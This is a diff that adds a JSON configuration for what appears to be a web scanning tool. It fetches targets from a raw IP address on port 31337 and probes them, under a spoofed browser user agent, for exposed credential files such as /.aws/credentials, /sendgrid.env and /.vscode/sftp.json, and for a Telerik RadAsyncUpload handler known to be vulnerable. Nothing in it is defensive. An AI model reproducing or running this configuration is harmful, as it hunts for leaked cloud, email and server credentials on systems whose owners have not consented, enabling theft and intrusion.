@@ -1,0 +1,17 @@
+{
+  "method": "HEAD",
+  "statuscode": [200, 301],
+  "inputUrl": "http://103.191.50.59:31337/op/get.php",
+  "threads": 10,
+  "timeout": 15,
+   "paths": ["/.aws/credentials", "/sendgrid.env", "/Telerik.Web.UI.WebResource.axd?type=rau", "/.vscode/sftp.json"],
+  "contents": [
+    "application/json",
+    "RadAsyncUpload",
+    "text/plain",
+    "rsdsdfd"
+  ],
+  "regex": [".&fhshf"],
+  "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
+  "iterationDelay": 30
+}
